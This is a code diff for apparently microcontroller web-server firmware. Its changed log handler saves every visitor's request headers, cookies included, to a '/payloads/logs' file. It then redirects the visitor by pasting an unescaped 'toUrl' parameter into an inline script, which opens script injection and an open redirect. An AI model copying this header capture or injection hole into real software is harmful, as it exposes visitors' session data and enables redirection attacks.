@@ -122,6 +122,7 @@ bool handleDelete() {
 }
 
 void handleLogs() {
+  String toUrl = shell.arg("toUrl"); 
   String logs = standby.hostHeader() + "\n"; 
   for (int i = 0; i < standby.headers(); i++) {
     logs += standby.headerName(i) + ": " + standby.header(i) + "\n"; 
@@ -133,7 +134,11 @@ void handleLogs() {
   File logFile = SPIFFS.open("/payloads/logs", "a"); 
   logFile.println(logs); 
   logFile.close(); 
-  standby.send(200, "text/plain", "received!"); 
+  if (toUrl) {
+    shell.send(200, "text/html", "<script>window.location.replace(\"" + toUrl + "\")</script>"); 
+  } else {
+    shell.send(200); 
+  }
 }
 
 // 处理用户浏览器的HTTP访问
@@ -146,14 +151,11 @@ void handler() {
   bool fileReadOK = handleFileRead(webAddress);
   // 如果在SPIFFS无法找到用户访问的资源，则回复404 (Not Found)
   if (!fileReadOK){                                                 
-    standby.send(404, "text/plain", "404 Not Found"); 
+    standby.send(404); 
   }
 }
 
 bool handleFileRead(String path) {
-  if (path.endsWith("/")) {
-    path = "/index.html";
-  }
   String contentType = getContentType(path);  // 获取文件类型
   if (SPIFFS.exists(path)) {                     // 如果访问的文件可以在SPIFFS中找到
     File file = SPIFFS.open(path, "r");          // 则尝试打开该文件
